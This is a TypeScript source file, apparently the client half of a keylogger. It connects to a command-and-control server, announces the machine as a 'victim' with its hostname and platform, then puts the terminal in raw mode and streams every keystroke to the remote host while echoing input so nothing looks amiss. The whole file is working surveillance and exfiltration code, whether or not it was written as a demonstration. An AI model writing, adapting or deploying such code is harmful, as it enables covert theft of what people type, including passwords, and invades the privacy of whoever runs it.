import { createConnection } from "node:net";
import { hostname, platform } from "node:os";
import { randomUUID } from "node:crypto";
import { parseKey, toHex } from "./keyParser.js";
import { DEFAULT_HOST, DEFAULT_PORT } from "./protocol.js";
import type { C2Message } from "./protocol.js";

const sessionId = randomUUID();
const stdin = process.stdin;

if (!stdin.isTTY) {
  process.stderr.write("precisa de um TTY\n");
  process.exit(1);
}

const socket = createConnection({ host: DEFAULT_HOST, port: DEFAULT_PORT }, () => {
  socket.write(JSON.stringify({
    type: "handshake",
    victim: { sessionId, platform: platform(), nodeVersion: process.version, hostname: hostname() },
  } satisfies C2Message) + "\n");

  process.stdout.write("\x1b[2J\x1b[H");

  stdin.setRawMode(true);
  stdin.resume();

  stdin.on("data", (data: Buffer) => {
    const { key, category } = parseKey(data);

    if (key === "Ctrl+C" || key === "Ctrl+D") {
      socket.write(JSON.stringify({ type: "disconnect" } satisfies C2Message) + "\n");
      socket.end();
      stdin.setRawMode(false);
      process.exit(0);
    }

    socket.write(JSON.stringify({
      type: "key",
      event: { timestamp: new Date().toISOString(), elapsedMs: 0, key, raw: toHex(data), category },
    } satisfies C2Message) + "\n");

    if (category === "char") {
      process.stdout.write(key);
    } else if (key === "Enter") {
      process.stdout.write("\n");
    } else if (key === "Backspace") {
      process.stdout.write("\b \b");
    }
  });
});

socket.on("error", (err) => {
  process.stderr.write(`${DEFAULT_HOST}:${DEFAULT_PORT}: ${err.message}\n`);
  process.exit(1);
});
